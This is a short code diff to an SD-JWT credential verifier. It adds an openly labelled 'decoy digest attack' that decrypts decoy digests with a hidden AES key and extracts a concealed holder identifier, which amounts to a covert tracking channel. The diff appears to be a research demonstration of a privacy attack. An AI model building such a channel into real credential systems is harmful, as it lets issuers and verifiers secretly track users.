@@ -201,9 +201,30 @@ class SDJWTVerifier(SDJWTCommon):
                         )
                     unpacked_value = self._unpack_disclosed_claims(value)
                     pre_output[key] = unpacked_value
+                else:
+                    # DECOY DIGEST ATTACK: decrypt cipher blocks and extract hidden payload
+                    # (this iterates all undisclosed attributes + decoy digests)
+                    try:
+                        raw = self._base64url_decode(digest)
+                    except Exception:
+                        raw = None
+
+                    if raw is not None and len(raw) == 16:
+                        cipher = AES.new(self.hidden_encryption_key, AES.MODE_CBC, iv=b"\x00" * 16)
+                        pt = cipher.decrypt(raw)
+                        print(f"Got cleartext from [DECOY] msg: {pt}")
+
+                        # extremely hacky way of reconstructing the hidden id... but since order function shuffles the order of digests the first decoy digest
+                        # does not always contain the id, so we look for the needle in the hidden details, definitively not a great solution, but it works
+                        # well for demo purposes
+                        needle = b"LoremIpsum"
+                        idx = pt.find(needle)
+                        if idx >= 4:
+                            hidden_id = int.from_bytes(pt[idx - 4 : idx], "big")
+                            print(f"[DECOY] extracted hidden_id={hidden_id} (bytes={pt[idx-4:idx].hex()})")
+
 
             # Now, go through the dict and unpack any nested dicts.
-
             return pre_output
 
         else:
